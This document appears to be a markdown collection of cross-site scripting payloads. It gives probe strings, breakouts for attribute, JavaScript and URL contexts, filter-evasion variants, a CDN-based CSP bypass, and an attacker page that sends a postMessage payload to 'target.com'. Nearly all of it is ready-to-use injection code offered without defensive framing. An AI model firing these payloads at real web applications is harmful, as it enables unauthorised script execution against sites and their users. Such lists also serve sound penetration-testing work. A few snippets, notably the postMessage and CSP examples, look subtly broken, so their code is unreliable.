# XSS Payload Collection

## Standard probes
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<select autofocus onfocus=alert(1)>
```

## Context-specific

### HTML attribute (double-quoted)
```
" onmouseover=alert(1) x="
" autofocus onfocus=alert(1) x="
" onclick=alert(1) x="
"><script>alert(1)</script>
```

### HTML attribute (single-quoted)
```
' onmouseover=alert(1) x='
' autofocus onfocus=alert(1) x='
'><script>alert(1)</script>
```

### JavaScript context
```
'; alert(1); //
"; alert(1); //
</script><script>alert(1)</script>
-test'+(alert)(1)+'
\"-alert(1)}//
```

### URL context
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## WAF bypass variants
```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

## CSP bypass when script-src allows CDN
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script>Element.prototype.scrollTo=alert</script>
```

## postMessage XSS (send from attacker page)
```html
<iframe src="https://target.com/page-with-postmessage-listener"></iframe>
<script>
window.open('https://target.com/page-with-postmessage-listener');
setTimeout(() => {
  opener.postMessage('<img src=x onerror=alert(document.domain)>', '*');
}, 2000);
</script>
```

## Short payloads (< 30 chars)
```html
<svg/onload=alert(1)>
<body/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=alert(1)>
```
